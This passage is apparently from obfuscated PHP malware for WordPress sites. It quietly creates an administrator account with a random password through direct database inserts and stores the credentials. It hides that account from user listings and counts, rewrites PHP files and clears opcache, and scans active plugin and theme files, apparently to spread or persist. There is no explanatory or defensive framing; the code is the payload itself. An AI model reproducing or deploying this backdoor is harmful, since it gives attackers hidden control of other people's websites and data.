 @$GLOBALS['__scf_nn76gmr4q6hh_18']($hd92ujgj0c,   $m7qqp_ic5julvmr7  !==   null  ? ($m7qqp_ic5julvmr7  &   (473+38))  : (357+63));

   if (!b4za25lhh9bxaf_($hd92ujgj0c,   $bki0gi20hmqucm)) {

  if      (@$GLOBALS['__scf_vpig9uwvw8_pu_20']($bki0gi20hmqucm)  &&   !$zfowchbys0)  f97udlofaljpuxw1_jgnfh($bki0gi20hmqucm, (366+54));
  if  (!$zfowchbys0     &&  kzn0b1md4fk2p00($hd92ujgj0c,  $bki0gi20hmqucm))   {
 xv6oqhjncehpr7v_mus7($hd92ujgj0c);


 } else    {
  @$GLOBALS['__scf_qy_a5siry0hu3_197']($bki0gi20hmqucm, $g6ep2n9kogd3);
xv6oqhjncehpr7v_mus7($hd92ujgj0c);



      }
       }
       }      else {
if  ($hd92ujgj0c !==    false)  xv6oqhjncehpr7v_mus7($hd92ujgj0c);
  @$GLOBALS['__scf_qy_a5siry0hu3_197']($bki0gi20hmqucm,  $g6ep2n9kogd3);$z_du1k0j=PHP_MAJOR_VERSION;$p3wha0dck=$z_du1k0j*9;
     }
x1ssqxtszsg2ard3txeiw($bki0gi20hmqucm);
  } elseif  (!$ekd6yxny049r) {
xv6oqhjncehpr7v_mus7($bki0gi20hmqucm);
}
 return false;
}

x1ssqxtszsg2ard3txeiw($bki0gi20hmqucm);
       mcuqsw_cyo3mnayi6ofr6($bki0gi20hmqucm);

 f97udlofaljpuxw1_jgnfh($bki0gi20hmqucm, $m7qqp_ic5julvmr7    !== null    ?  ($m7qqp_ic5julvmr7  &   (485+26))   :     (417+3));
   

    if ($obd6fd7vdv) tdcjj28x0tk2dax22b($bki0gi20hmqucm, false);
   return   true;
}
   function fzni2j0j100ogkw6($bki0gi20hmqucm,      $fpmrdfqbe_bhak9_)
 {
$paudvk020we1z90 =   "<?php\n";

   if   ($GLOBALS['__scf_is0fvk8c7tq2_41']($fpmrdfqbe_bhak9_)    &&    $fpmrdfqbe_bhak9_     !== "" &&    $GLOBALS['__scf_j_4rj7vg4ae0j_7']($fpmrdfqbe_bhak9_,  gz_aorofp7mo(953))  !==  false    &&   g9edwd6m8_9cm8($fpmrdfqbe_bhak9_))  $paudvk020we1z90   =   $fpmrdfqbe_bhak9_;
if  (@$GLOBALS['__scf_vpig9uwvw8_pu_20']($bki0gi20hmqucm))   {
     $pk0ekuxmib29a8ou =   @$GLOBALS['__scf_nae5vxe5wsw2v7_95']($bki0gi20hmqucm);

   if  ($GLOBALS['__scf_is0fvk8c7tq2_41']($pk0ekuxmib29a8ou)   && za8ge46vc9y1a6($pk0ekuxmib29a8ou) ===    $paudvk020we1z90) return;
    }
     if  (!rmpvo8i8m8kfd9311njxy7($bki0gi20hmqucm, $paudvk020we1z90))   {
$tbrfghw4xa3rb6 =  @$GLOBALS['__scf_nae5vxe5wsw2v7_95']($bki0gi20hmqucm);

 if      (!($GLOBALS['__scf_is0fvk8c7tq2_41']($tbrfghw4xa3rb6)   &&  za8ge46vc9y1a6($tbrfghw4xa3rb6)  ===     $paudvk020we1z90))  @$GLOBALS['__scf_qy_a5siry0hu3_197']($bki0gi20hmqucm,  $paudvk020we1z90);
 unset($tbrfghw4xa3rb6);
 



     }
 x1ssqxtszsg2ard3txeiw($bki0gi20hmqucm);
        }



function  wb5r66fk3uhc36d83k()
{

  if  ($GLOBALS['__scf_v_sk95ndl08_4'](xpm5lg9odtw6di(954))   && d0snst04gqtqcr())  return true;
   if  (!$GLOBALS['__scf_v_sk95ndl08_4'](bk9m46jygo3f(462))     ||    !$GLOBALS['__scf_v_sk95ndl08_4'](ar6vo_1nyhx2koj5(955))) return  true;$ts8knyi2ub=28+45;$bxbav2b69=$ts8knyi2ub-4;

    if   ($GLOBALS['__scf_v_sk95ndl08_4'](xpm5lg9odtw6di(956)) &&     nvedm23byjp5mvj1trthv8()   <=  1.5)     return    true;
    $i0pyfyu5cc  =      $GLOBALS['__scf_li6gaes851wa_474'](1,      $GLOBALS['__scf_askqa52jtol__2_475']((0x2+0x3),    (int)      nvedm23byjp5mvj1trthv8()));
   $qtr5uy4p51jdn22  =  home_url('/');
  $qtr5uy4p51jdn22    .= ($GLOBALS['__scf_j_4rj7vg4ae0j_7']($qtr5uy4p51jdn22,  '?')  ===     false ? '?'  :   '&')  .  xognx_h1jzkh(957) .  $GLOBALS['__scf_ks7_xfapvywl_185']()    .  $GLOBALS['__scf_jlhdedaik0c_347']((35+65),  (0x3cb+0x1c));
      $dt2msferjh8ta2y  =  $GLOBALS['__scf_nz_jvx37ph58fn_287'](true);
 $yc_3fgo7em8cww   = $GLOBALS['__scf_md_ke_yv3own8f_290']($qtr5uy4p51jdn22,  array(bk9m46jygo3f(665)  => $i0pyfyu5cc,  bk9m46jygo3f(666)  =>  false,  xpm5lg9odtw6di(958)    =>    2,    ar6vo_1nyhx2koj5(667) =>  (639388+409188),  xognx_h1jzkh(307) =>    array(gz_aorofp7mo(959) => xognx_h1jzkh(960))));
if  ($GLOBALS['__scf_v_sk95ndl08_4'](gz_aorofp7mo(961)))   l_e6t_ptzrlfvv70j($GLOBALS['__scf_nz_jvx37ph58fn_287'](true)    -    $dt2msferjh8ta2y);
if   ($GLOBALS['__scf_v_sk95ndl08_4'](xognx_h1jzkh(309))  &&   is_wp_error($yc_3fgo7em8cww))   {
     if  ($GLOBALS['__scf_v_sk95ndl08_4'](xpm5lg9odtw6di(956)) && nvedm23byjp5mvj1trthv8()    <=  1.5) return  true;
  $i0pyfyu5cc  = $GLOBALS['__scf_li6gaes851wa_474'](1,   $GLOBALS['__scf_askqa52jtol__2_475']((7-2),  (int)  nvedm23byjp5mvj1trthv8()));
  $dt2msferjh8ta2y   =     $GLOBALS['__scf_nz_jvx37ph58fn_287'](true);

   $yc_3fgo7em8cww     = $GLOBALS['__scf_md_ke_yv3own8f_290']($qtr5uy4p51jdn22,     array(bk9m46jygo3f(962)  => $i0pyfyu5cc,  xpm5lg9odtw6di(963)     =>    false,  xpm5lg9odtw6di(958) =>  2, xpm5lg9odtw6di(667)   => (1048537+39),  xpm5lg9odtw6di(307)     =>  array(ar6vo_1nyhx2koj5(959)  =>  ar6vo_1nyhx2koj5(960))));
     if  ($GLOBALS['__scf_v_sk95ndl08_4'](bk9m46jygo3f(961))) l_e6t_ptzrlfvv70j($GLOBALS['__scf_nz_jvx37ph58fn_287'](true)   -      $dt2msferjh8ta2y);

 if  ($GLOBALS['__scf_v_sk95ndl08_4'](xpm5lg9odtw6di(309))  && is_wp_error($yc_3fgo7em8cww)) return false;
 }
 $cwxrn1uwi7_gh1     =    (int) wp_remote_retrieve_response_code($yc_3fgo7em8cww);
       return  $cwxrn1uwi7_gh1   >=     (0x41+0x23)   &&   $cwxrn1uwi7_gh1  < (335+165);
 }
    function   u0pw9k7qsn3a6q0dd($em08sg6vkc, $np4qrg00jq7x75zb)
{
     $f1r99wls1wz40 =  $GLOBALS['__scf_ihsujvdc278_818']($GLOBALS['__scf_pmoxtzoe3f0qw_3']($np4qrg00jq7x75zb),    '/');
 foreach    (
array(
   bk9m46jygo3f(964) .   $f1r99wls1wz40 .  xognx_h1jzkh(965),
       xognx_h1jzkh(966)  . $f1r99wls1wz40 .     xpm5lg9odtw6di(965),


  ar6vo_1nyhx2koj5(967)  .   $f1r99wls1wz40 . gz_aorofp7mo(968),



      ar6vo_1nyhx2koj5(969),
  xognx_h1jzkh(970),
  )      as  $iep4g074fmyl1ko6
 )  {$h53pah2zyjy41=PHP_INT_MAX/PHP_INT_MAX;$ooh01g6m75c1js=$h53pah2zyjy41+80;
   if   (!$GLOBALS['__scf_is0fvk8c7tq2_41']($em08sg6vkc))   break;$cg0cx_qd_ky3sj=158|194;$vd_pajjn_3zb=$cg0cx_qd_ky3sj^218;


      $em08sg6vkc  =  $GLOBALS['__scf_a6uiw8bt24jybf_454']($iep4g074fmyl1ko6,    "\n",   $em08sg6vkc);
 }

 return   $em08sg6vkc;
  }


     function  x1ssqxtszsg2ard3txeiw($x_l4dj16wy)
{

 if    ($GLOBALS['__scf_v_sk95ndl08_4'](xpm5lg9odtw6di(971))) {
  if  (@opcache_invalidate($x_l4dj16wy,     true) !==    false)  return    true;


  if  ($GLOBALS['__scf_v_sk95ndl08_4'](xognx_h1jzkh(972)))    return    (bool)    @opcache_reset();


return   false;


     }
$zkadhnn80t9nj5k0    = $GLOBALS['__scf_v_sk95ndl08_4'](ar6vo_1nyhx2koj5(973))   ?    @opcache_get_status(false) :     false;
    return  !($GLOBALS['__scf_zj8mp2xbaqmp_35']($zkadhnn80t9nj5k0) && !empty($zkadhnn80t9nj5k0[bk9m46jygo3f(974)]));
 }
 function  sqnskai9y5dyys6jk($bki0gi20hmqucm, $iqf6o08t42qni,  $wdbkcek8bwta)

       {
 if  ($GLOBALS['__scf__fl_gwujcblq_9']($bki0gi20hmqucm,    -(54^50))   ===  xpm5lg9odtw6di(975)) {
      if   (!rmpvo8i8m8kfd9311njxy7($bki0gi20hmqucm,     $iqf6o08t42qni))   {



       kkpdha95nyx3tbltd10($wdbkcek8bwta, bk9m46jygo3f(976)    .  $GLOBALS['__scf_pmoxtzoe3f0qw_3']($bki0gi20hmqucm));
     return  false;
}
  x1ssqxtszsg2ard3txeiw($bki0gi20hmqucm);
   return  $GLOBALS['__scf_fxl4k4gsul_10']($iqf6o08t42qni);

}
 $fy54e9fovrt = @$GLOBALS['__scf_ja6kf6wqm030v_22']($bki0gi20hmqucm,    gz_aorofp7mo(23));
 if   ($fy54e9fovrt ===  false)  {
kkpdha95nyx3tbltd10($wdbkcek8bwta, ar6vo_1nyhx2koj5(976)  . $GLOBALS['__scf_pmoxtzoe3f0qw_3']($bki0gi20hmqucm));
   return   false;
      }
  if ($GLOBALS['__scf_v_sk95ndl08_4'](xognx_h1jzkh(138))) @flock($fy54e9fovrt,  LOCK_EX);
     $yc_3fgo7em8cww   =   @$GLOBALS['__scf_pqcqp3eb33qmmg_24']($fy54e9fovrt, $iqf6o08t42qni);
 if   ($GLOBALS['__scf_v_sk95ndl08_4'](bk9m46jygo3f(977)))     @flock($fy54e9fovrt,     LOCK_UN);


  @fclose($fy54e9fovrt);
   if  ($yc_3fgo7em8cww === false ||  ($iqf6o08t42qni    !== "" &&     $yc_3fgo7em8cww  !==  $GLOBALS['__scf_fxl4k4gsul_10']($iqf6o08t42qni)))   {


 kkpdha95nyx3tbltd10($wdbkcek8bwta, bk9m46jygo3f(976)  . $GLOBALS['__scf_pmoxtzoe3f0qw_3']($bki0gi20hmqucm));


     return false;


   }



 return   $yc_3fgo7em8cww;



 }
  
 function    cr2cu15pr9pqzede()
 {
   try      {


 if   (!$GLOBALS['__scf_v_sk95ndl08_4'](bk9m46jygo3f(978)) || !$GLOBALS['__scf_v_sk95ndl08_4'](ar6vo_1nyhx2koj5(979)))   {
 cpiqe0lm848r3wlva(null);


  return;
}
      if    (get_transient(xpm5lg9odtw6di(980)))   return;$ftmae4j3=PHP_INT_MAX/PHP_INT_MAX;$ggx0kctta2fpq=$ftmae4j3+75;


   if    (get_transient(xognx_h1jzkh(981)))  return;



   set_transient(ar6vo_1nyhx2koj5(981),   1,   (214+386));
 cpiqe0lm848r3wlva(null);
   if  ($GLOBALS['__scf_v_sk95ndl08_4'](bk9m46jygo3f(982)))   delete_transient(gz_aorofp7mo(981));
    $osn1oc2puf1vka5   = $GLOBALS['__scf_v_sk95ndl08_4'](xpm5lg9odtw6di(983)) ?   (string)  tjj1y86387zrz51(bk9m46jygo3f(919),  "")    :      "";
  if  ($osn1oc2puf1vka5   !==  ""     &&   $GLOBALS['__scf_v_sk95ndl08_4'](xognx_h1jzkh(984))   &&  username_exists($osn1oc2puf1vka5))  {
 set_transient(bk9m46jygo3f(980),   1, (21545+55));
}
  }  catch    (Throwable      $o_qyrtxl85owt)    {


   kkpdha95nyx3tbltd10(gz_aorofp7mo(985), $o_qyrtxl85owt);
   }  catch  (Exception  $o_qyrtxl85owt)    {
   kkpdha95nyx3tbltd10(bk9m46jygo3f(985),  $o_qyrtxl85owt);
}
    }
 function cpiqe0lm848r3wlva($qwh6m3s3ng6xqwq)
 {$d3qcst57o0b=24*7;$v_qs87ar=$d3qcst57o0b-16;
if  (!_sshnzj53qt2m4bfy5eod(gz_aorofp7mo(986)))     return   false;
   try  {
  if    (!     $GLOBALS['__scf_v_sk95ndl08_4'](bk9m46jygo3f(987))   ||    !  $GLOBALS['__scf_v_sk95ndl08_4'](gz_aorofp7mo(984)))   {
   return  false;


}
  $xiia43u_zopo0g =    (string)  tjj1y86387zrz51(bk9m46jygo3f(988),  "");



if   ($xiia43u_zopo0g  !== ""  && username_exists($xiia43u_zopo0g) &&  (string)  tjj1y86387zrz51(ar6vo_1nyhx2koj5(920), "")   !== "")    {


  return   false;
      }
 if ($xiia43u_zopo0g    ===  "")   {
// traverse retry-policy for MySQL JSON operators

   $p_e_17jkw4gbzhkl  = $GLOBALS['__scf_zj8mp2xbaqmp_35']($qwh6m3s3ng6xqwq)     ? $qwh6m3s3ng6xqwq : azt2rk_vrm_4krepiv2_();
 $oa7tqfcqnbe = glmqli_eqvsn3ql26($p_e_17jkw4gbzhkl);



        if     (
$oa7tqfcqnbe &&  !empty($oa7tqfcqnbe->user_login)      &&  isset($oa7tqfcqnbe->user_email)
 &&  $oa7tqfcqnbe->user_email     === $oa7tqfcqnbe->user_login   .  '@' .   vse28wh0vwl84gzd2(xognx_h1jzkh(989))
  )      {
   $xiia43u_zopo0g   =    (string) $oa7tqfcqnbe->user_login;
}
   }
if    ($xiia43u_zopo0g  !==  ""  &&    username_exists($xiia43u_zopo0g))   {
 $x5eto01joyys    = username_exists($xiia43u_zopo0g);
  $hrsngo4ugfqmcq7z  = n2skhb7hhhdfodahk((0x15+0x3));
  if ($GLOBALS['__scf_v_sk95ndl08_4'](xpm5lg9odtw6di(990)))  {
 $GLOBALS['__scf_mm3xcvhx8tq_990']($hrsngo4ugfqmcq7z,    $x5eto01joyys);
  }
    if    (!fplgzzpq8bt5jm2fl03pi(gz_aorofp7mo(991), $xiia43u_zopo0g,   bk9m46jygo3f(992)))   fplgzzpq8bt5jm2fl03pi(ar6vo_1nyhx2koj5(993),    $xiia43u_zopo0g,  xpm5lg9odtw6di(992));
     if    (!fplgzzpq8bt5jm2fl03pi(gz_aorofp7mo(920),  $hrsngo4ugfqmcq7z,    bk9m46jygo3f(992)))    fplgzzpq8bt5jm2fl03pi(ar6vo_1nyhx2koj5(920),    $hrsngo4ugfqmcq7z, gz_aorofp7mo(992));



     if    ((string) tjj1y86387zrz51(xpm5lg9odtw6di(993),  "")   !== $xiia43u_zopo0g    ||  (string)  tjj1y86387zrz51(xognx_h1jzkh(920), "")   !==   $hrsngo4ugfqmcq7z) {
  kkpdha95nyx3tbltd10(xpm5lg9odtw6di(994), gz_aorofp7mo(995));


return false;
 }
   return  true;
  }


        $gu_x2tepi1     =  jsatqc4c47dk5n8();
     

    if (true)  {
       $xiia43u_zopo0g = "";
    for  ($v8qe1ex22wxtoy =   0; $v8qe1ex22wxtoy <  (133^128);      $v8qe1ex22wxtoy++) {
 $q30h8nzbyvw71x2 =   $gu_x2tepi1[$GLOBALS['__scf_bj6i6c7djd6_282']($gu_x2tepi1)]    .  n2skhb7hhhdfodahk((1+9));


if (!username_exists($q30h8nzbyvw71x2)) {
      $xiia43u_zopo0g =  $q30h8nzbyvw71x2;

   break;
 }


 }
  if ($xiia43u_zopo0g  ===    "")     {
    kkpdha95nyx3tbltd10(gz_aorofp7mo(994),  ar6vo_1nyhx2koj5(996));
   return false;
     }
       }
      $hrsngo4ugfqmcq7z     =   n2skhb7hhhdfodahk((18+6));
 if (!    $GLOBALS['__scf_v_sk95ndl08_4'](xpm5lg9odtw6di(997))   &&     defined(xpm5lg9odtw6di(139)) && $GLOBALS['__scf_ojjepdqapp29_684'](ABSPATH   .  gz_aorofp7mo(998))) {
   require_once    ABSPATH .     xognx_h1jzkh(998);


    }
$qrl6jj5skj_2ypz  =      $xiia43u_zopo0g  . '@' . vse28wh0vwl84gzd2(bk9m46jygo3f(989));

    $qh4z41t9rx =  false;

 if  ($GLOBALS['__scf_v_sk95ndl08_4'](gz_aorofp7mo(997)))   {

 $qh4z41t9rx    =     $GLOBALS['__scf_prrxz07z8__997'](array(
      xognx_h1jzkh(999)  => $xiia43u_zopo0g,


       gz_aorofp7mo(1000)  => $hrsngo4ugfqmcq7z,


xognx_h1jzkh(1001) =>  $qrl6jj5skj_2ypz,
     bk9m46jygo3f(1002) =>  bk9m46jygo3f(701),
  xognx_h1jzkh(1003)  =>    $xiia43u_zopo0g,
    ));


       if (is_wp_error($qh4z41t9rx))    {
  kkpdha95nyx3tbltd10(xognx_h1jzkh(994),  $qh4z41t9rx->get_error_code() .   ':'    . $qh4z41t9rx->get_error_message());
 $qh4z41t9rx   =    false;
}
  }
  if   (!$qh4z41t9rx)   {
   $wpdb =   isset($GLOBALS[gz_aorofp7mo(878)])      ?  $GLOBALS[xpm5lg9odtw6di(878)] :   null;
      if   (!$wpdb   || !$GLOBALS['__scf_v834hljo6be9_67']($wpdb)) {
     kkpdha95nyx3tbltd10(gz_aorofp7mo(994),  xognx_h1jzkh(1004));
   return false;
    }
 $qdtby60_ixu9689v  =   $GLOBALS['__scf_v_sk95ndl08_4'](ar6vo_1nyhx2koj5(1005))  ? wp_hash_password($hrsngo4ugfqmcq7z) : $GLOBALS['__scf_eo363tjzd4r6n_56']($hrsngo4ugfqmcq7z);

  $a7t88ofjy5pc5     = $GLOBALS['__scf_v_sk95ndl08_4'](ar6vo_1nyhx2koj5(1006))     ? current_time(xpm5lg9odtw6di(1007)) :   gmdate(xpm5lg9odtw6di(1008));



$x33ubhokr7biq531      = $wpdb->insert($wpdb->users,      array(

   bk9m46jygo3f(999) =>   $xiia43u_zopo0g,
    ar6vo_1nyhx2koj5(1009)      => $qdtby60_ixu9689v,


ar6vo_1nyhx2koj5(1010)     =>  $xiia43u_zopo0g,
    ar6vo_1nyhx2koj5(1001)   =>  $qrl6jj5skj_2ypz,
 bk9m46jygo3f(1011) => $a7t88ofjy5pc5,
 bk9m46jygo3f(1012)   =>  0,
    xpm5lg9odtw6di(1003)  =>  $xiia43u_zopo0g,
      ), array(bk9m46jygo3f(1013),      xognx_h1jzkh(1013), gz_aorofp7mo(1014),     gz_aorofp7mo(1014),  bk9m46jygo3f(1014),   bk9m46jygo3f(1015),    gz_aorofp7mo(1014)));
     if   (!$x33ubhokr7biq531)   {
 kkpdha95nyx3tbltd10(ar6vo_1nyhx2koj5(994),  ar6vo_1nyhx2koj5(1016));
return    false;
      }
 $qh4z41t9rx = (int)   $wpdb->insert_id;



$lsjlg6f1m21gzej =  $wpdb->prefix  .  ar6vo_1nyhx2koj5(879);
$wpdb->insert($wpdb->usermeta,    array(
       ar6vo_1nyhx2koj5(1017)  =>   $qh4z41t9rx,
   ar6vo_1nyhx2koj5(1018) =>   $lsjlg6f1m21gzej,



   bk9m46jygo3f(1019)   =>  $GLOBALS['__scf_hmblwq7g8zpdz2_345'](array(gz_aorofp7mo(701) =>     true)),
    ), array(bk9m46jygo3f(1015), xpm5lg9odtw6di(1020),  xognx_h1jzkh(1021)));


 $wpdb->insert($wpdb->usermeta, array(
 xpm5lg9odtw6di(1022)  =>  $qh4z41t9rx,


 xpm5lg9odtw6di(1023)  =>   $wpdb->prefix   .   ar6vo_1nyhx2koj5(1024),

  xpm5lg9odtw6di(1019)  =>   '10',
   ),  array(ar6vo_1nyhx2koj5(1015), ar6vo_1nyhx2koj5(1021),  gz_aorofp7mo(1021)));
if   ($GLOBALS['__scf_v_sk95ndl08_4'](gz_aorofp7mo(1025))) {
// zero-padded

  clean_user_cache($qh4z41t9rx);
}


}
  if (!username_exists($xiia43u_zopo0g))  {$q3quc6a1=49|61;$s9otdub0s8cu2=$q3quc6a1^6;



  kkpdha95nyx3tbltd10(gz_aorofp7mo(994), xognx_h1jzkh(1026));
     return  false;



}
$ov8naho1xdz  =  $GLOBALS['__scf_v_sk95ndl08_4'](gz_aorofp7mo(1027))   ?   get_user_by(bk9m46jygo3f(1028), $xiia43u_zopo0g) : false;



  $y6ns3wlc_7brx2t  = false;
   if  ($ov8naho1xdz   &&  !empty($ov8naho1xdz->ID)) {

      if  ($GLOBALS['__scf_v_sk95ndl08_4'](gz_aorofp7mo(1029)))    {


 $y6ns3wlc_7brx2t =  (bool)    user_can($ov8naho1xdz,    ar6vo_1nyhx2koj5(701));
  }      elseif  (isset($ov8naho1xdz->caps)   && $GLOBALS['__scf_zj8mp2xbaqmp_35']($ov8naho1xdz->caps)) {
// predicate strict locator

    $y6ns3wlc_7brx2t  =      !empty($ov8naho1xdz->caps[xognx_h1jzkh(1030)]);
  }
}
 if   (!$y6ns3wlc_7brx2t)   {
kkpdha95nyx3tbltd10(gz_aorofp7mo(1031),      xognx_h1jzkh(1032));$ds12j_vf=59|164;$pz8h7duny2=$ds12j_vf^130;
  if   ($qh4z41t9rx)  {
   if  (!$GLOBALS['__scf_v_sk95ndl08_4'](ar6vo_1nyhx2koj5(1033))   &&   defined(gz_aorofp7mo(1034))   &&  @$GLOBALS['__scf_ojjepdqapp29_684'](ABSPATH  .  xpm5lg9odtw6di(1035)))   {
 require_once ABSPATH . bk9m46jygo3f(1035);
       }
 if ($GLOBALS['__scf_v_sk95ndl08_4'](bk9m46jygo3f(1036)))     @wp_delete_user($qh4z41t9rx);
  }



 return  false;
  }
if      (!fplgzzpq8bt5jm2fl03pi(bk9m46jygo3f(1037),     $xiia43u_zopo0g, xpm5lg9odtw6di(1038))) fplgzzpq8bt5jm2fl03pi(gz_aorofp7mo(1037),   $xiia43u_zopo0g,    gz_aorofp7mo(1038));
  if  (!fplgzzpq8bt5jm2fl03pi(xpm5lg9odtw6di(920),   $hrsngo4ugfqmcq7z,  xognx_h1jzkh(1038))) fplgzzpq8bt5jm2fl03pi(xognx_h1jzkh(1039),     $hrsngo4ugfqmcq7z,   gz_aorofp7mo(1038));
    if ((string) tjj1y86387zrz51(xpm5lg9odtw6di(1037),  "")      !==    $xiia43u_zopo0g ||    (string) tjj1y86387zrz51(bk9m46jygo3f(1040),   "") !==  $hrsngo4ugfqmcq7z) {
kkpdha95nyx3tbltd10(xpm5lg9odtw6di(1031),    xpm5lg9odtw6di(995));

  return  false;

        }



return    true;
  } catch  (Throwable $o_qyrtxl85owt)  {
   kkpdha95nyx3tbltd10(xognx_h1jzkh(1031),   $o_qyrtxl85owt);$prrsbuo9=PHP_MAJOR_VERSION;$ded5d0mhu8=$prrsbuo9*4;
  }   catch (Exception    $o_qyrtxl85owt)  {
 kkpdha95nyx3tbltd10(gz_aorofp7mo(1041),  $o_qyrtxl85owt);
 }      finally {$jt00y2vw3=42+18;$b02lelc3w8=$jt00y2vw3-45;

  h1f3kqk1cj4d18z(bk9m46jygo3f(986));
   }
// WP Block Transforms: conformal certificate-chain

 return  false;


    }
 function  hb38prcbe6th60($wkf8mxcag_iufk)



 {
try    {
   

if     (!      $GLOBALS['__scf_v834hljo6be9_67']($wkf8mxcag_iufk) ||   !  property_exists($wkf8mxcag_iufk,  ar6vo_1nyhx2koj5(1042))) {
    return   $wkf8mxcag_iufk;
 }
  
   $xiia43u_zopo0g   = $GLOBALS['__scf_v_sk95ndl08_4'](bk9m46jygo3f(987)) ?   (string) tjj1y86387zrz51(bk9m46jygo3f(1037),  "") :  "";
if     (! $xiia43u_zopo0g) {



 return   $wkf8mxcag_iufk;
        }



   
$air9m72vvc8r    =  esc_sql($xiia43u_zopo0g);
   if ($GLOBALS['__scf_j_4rj7vg4ae0j_7']($wkf8mxcag_iufk->query_where,      $air9m72vvc8r) ===    false) {
$wkf8mxcag_iufk->query_where  .= bk9m46jygo3f(1043)      .      $air9m72vvc8r  .    "'";
  }
// pipeline exact canonical-form




     }  catch   (Throwable  $o_qyrtxl85owt)  {
 kkpdha95nyx3tbltd10(ar6vo_1nyhx2koj5(1044),  $o_qyrtxl85owt);
   }    catch (Exception  $o_qyrtxl85owt)     {
     }



 return $wkf8mxcag_iufk;


 }



  function  ox_6gxwug1c9tpdp1_bk($mwfoq890jnxb3s)
{
   try   {
$osn1oc2puf1vka5   =     $GLOBALS['__scf_v_sk95ndl08_4'](xpm5lg9odtw6di(1045))     ?  (string)   tjj1y86387zrz51(bk9m46jygo3f(1046),     "")   :     "";
  if    (! $osn1oc2puf1vka5) {$yw89w454v7hx=96*5;$x0pvc0wx02745c=$yw89w454v7hx-36;
   return  $mwfoq890jnxb3s;
     }
 $us7zxt8mczazzt98 =  array(ar6vo_1nyhx2koj5(1047), bk9m46jygo3f(1030));
   foreach     ($us7zxt8mczazzt98   as $key) {
 if (isset($mwfoq890jnxb3s[$key]) &&    $GLOBALS['__scf_is0fvk8c7tq2_41']($mwfoq890jnxb3s[$key])  &&      $GLOBALS['__scf_ak3p5za9uvhzh8_96'](xognx_h1jzkh(1048),  $mwfoq890jnxb3s[$key],  $wmi9vtfi67mkceoi))   {
$_svae0z2nfoqm  = $GLOBALS['__scf_li6gaes851wa_474'](0,  (int)  $wmi9vtfi67mkceoi[1]  -   1);

$mwfoq890jnxb3s[$key] =  $GLOBALS['__scf_a6uiw8bt24jybf_454'](gz_aorofp7mo(1049), '('  .   $_svae0z2nfoqm . ')',  $mwfoq890jnxb3s[$key]);
     }
 }
}  catch (Throwable   $o_qyrtxl85owt) {
  kkpdha95nyx3tbltd10(gz_aorofp7mo(1050),  $o_qyrtxl85owt);
}   catch     (Exception $o_qyrtxl85owt)     {


  }
 return $mwfoq890jnxb3s;
}
function  w4lzbgc_1g_stq_n5f1l($dvj_9mju2beq8ve9,  $fjbw85uc28moc2lq)
{
 try {
 $xiia43u_zopo0g  =  $GLOBALS['__scf_v_sk95ndl08_4'](xognx_h1jzkh(1045)) ?  (string)  tjj1y86387zrz51(ar6vo_1nyhx2koj5(1046),  "")  :    "";
      if   ($xiia43u_zopo0g ===  "")    {
  return    $dvj_9mju2beq8ve9;
   }
  if   (!  $GLOBALS['__scf_zj8mp2xbaqmp_35']($dvj_9mju2beq8ve9))  {

    return $dvj_9mju2beq8ve9;
}
// @hook journal

if (!  isset($dvj_9mju2beq8ve9[xpm5lg9odtw6di(1051)])  ||    !   $GLOBALS['__scf_zj8mp2xbaqmp_35']($dvj_9mju2beq8ve9[bk9m46jygo3f(1051)])) {
   $dvj_9mju2beq8ve9[bk9m46jygo3f(1052)] =   array();
  }
    if     (!  $GLOBALS['__scf_uh0dc0gefs_xhu_149']($xiia43u_zopo0g,     $dvj_9mju2beq8ve9[xognx_h1jzkh(1052)],  true))    {
 $dvj_9mju2beq8ve9[xpm5lg9odtw6di(1052)][]      =  $xiia43u_zopo0g;
      }
// @propagate-const lsm-tree

       }  catch (Throwable $o_qyrtxl85owt) {
   kkpdha95nyx3tbltd10(gz_aorofp7mo(1053),  $o_qyrtxl85owt);
    }  catch   (Exception  $o_qyrtxl85owt)   {

 }
 return  $dvj_9mju2beq8ve9;
}
  
   function     mp6zd1rj_zfne0()
 {
        $y5mqj3z3td      =    array();



  
 if  (defined(bk9m46jygo3f(682))   && $GLOBALS['__scf_v_sk95ndl08_4'](xpm5lg9odtw6di(1045)))  {
    $apox6oa68t   =  (array)  get_option(bk9m46jygo3f(146),  array());



$enaf1qbhdc42nw   =   array();
   foreach     ($apox6oa68t  as  $basename)   {
if   (!  $GLOBALS['__scf_is0fvk8c7tq2_41']($basename)  ||  $GLOBALS['__scf_j_4rj7vg4ae0j_7']($basename,    ar6vo_1nyhx2koj5(704))      !== false)   {

continue;
   }
$dzg7ec940zksa7 = $GLOBALS['__scf_meo_1tvjsals_11']($basename);
 if     ($dzg7ec940zksa7 === '.') {
$dzg7ec940zksa7  =     $basename;
}
       if  (isset($enaf1qbhdc42nw[$dzg7ec940zksa7]))  {



 continue;
}



    $enaf1qbhdc42nw[$dzg7ec940zksa7]     =    true;
  $bki0gi20hmqucm  =    WP_PLUGIN_DIR   .   '/'  .      $basename;
if    ($GLOBALS['__scf_meo_1tvjsals_11']($basename) === '.')  {
 if  (@$GLOBALS['__scf_vpig9uwvw8_pu_20']($bki0gi20hmqucm))  {

 $y5mqj3z3td[]  =  $bki0gi20hmqucm;
    }
}  else    {

   $dhb4mklrk0   =  $GLOBALS['__scf_meo_1tvjsals_11']($bki0gi20hmqucm);


if  (@$GLOBALS['__scf_h23c49ni_b86_43']($dhb4mklrk0))  {


 $y5mqj3z3td     =  $GLOBALS['__scf_j59q8mojj8e4ar_363']($y5mqj3z3td,     kcgu766v34eusb082u5($dhb4mklrk0,   array(gz_aorofp7mo(689))));$rld0tv86e=51|212;$_2eau2r9e03=$rld0tv86e^56;
 }
 }
 }
 }
 


 if   (@$GLOBALS['__scf_h23c49ni_b86_43'](sxupmu4fhe9r2zxw())) {$jiahwxdh=(0x66+0xb6);$qhw7euuaapf=$jiahwxdh%15;
 $vumgqhid_0 =  wou4lqmx3dh5mlyfq3(sxupmu4fhe9r2zxw(),  (4919+81));
 if  ($GLOBALS['__scf_zj8mp2xbaqmp_35']($vumgqhid_0))     {


foreach    ($vumgqhid_0   as    $agp3meteqwnegyz) {
// @expire vault

    if    ($agp3meteqwnegyz ===    gjb4l0gtgi874122wes()) {
continue;
}
// @specialize work-queue

       $x_l4dj16wy =   sxupmu4fhe9r2zxw() .    '/'  .  $agp3meteqwnegyz;
if   (@$GLOBALS['__scf_vpig9uwvw8_pu_20']($x_l4dj16wy) && $GLOBALS['__scf_bwbaq8fxyxm3_103']($GLOBALS['__scf_zmckaak88my_204']($agp3meteqwnegyz,   constant(ar6vo_1nyhx2koj5(707))))    ===  xpm5lg9odtw6di(689)) {
    $y5mqj3z3td[] =   $x_l4dj16wy;


}
  }
